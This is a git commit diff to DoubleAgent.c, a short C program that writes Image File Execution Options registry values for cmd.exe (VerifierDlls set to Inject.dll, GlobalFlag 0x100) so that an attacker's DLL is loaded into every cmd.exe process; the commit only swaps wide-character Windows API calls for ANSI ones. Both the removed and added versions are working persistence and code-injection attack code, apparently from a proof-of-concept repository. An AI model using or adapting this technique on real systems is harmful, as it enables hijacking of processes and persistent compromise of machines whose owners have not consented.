9dfda36b847fdfe086090758b1add2928fdbcff6
Kali-KM <rudals223@gmail.com>
2017-03-30 16:34:57 +0900

    modify DoubleAgent.c

--- c/DoubleAgent.c
+++ c/DoubleAgent.c
@@ -4,20 +4,20 @@
 int main()
 {
 	HKEY hKey;
-	DWORD dwFlag = 0x100;
-	LPCWSTR DllName = L"Inject.dll";
+	int dwFlag = 0x100;
+	char *DllName = "Inject.dll";
 
 	/* Get Key Handle - target process name is cmd.exe */
-	RegCreateKeyExW(
+	RegCreateKeyEx(
 		HKEY_LOCAL_MACHINE,
-		L"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe",
+		"Software\\Microsoft\\Windows NT\\CurrentVersion\\Image File Execution Options\\cmd.exe",
 		0, NULL, 0, KEY_ALL_ACCESS, NULL, &hKey,NULL);
 
 	/* Set Registry */
-	RegSetValueExW(
-		hKey, L"VerifierDlls", 0, REG_SZ, (LPBYTE)DllName, (lstrlenW(DllName) + 1) * sizeof(WCHAR));	
-	RegSetValueExW(
-		hKey, L"GlobalFlag", 0, REG_DWORD, (BYTE *)&dwFlag, sizeof(dwFlag));
+	RegSetValueEx(
+		hKey, "VerifierDlls", 0, REG_SZ, (BYTE *)DllName, (lstrlen(DllName)+1)*sizeof(char));	
+	RegSetValueEx(
+		hKey, "GlobalFlag", 0, REG_DWORD, (BYTE *)&dwFlag, sizeof(dwFlag));
 		
 	RegCloseKey(hKey);
 	return 0;
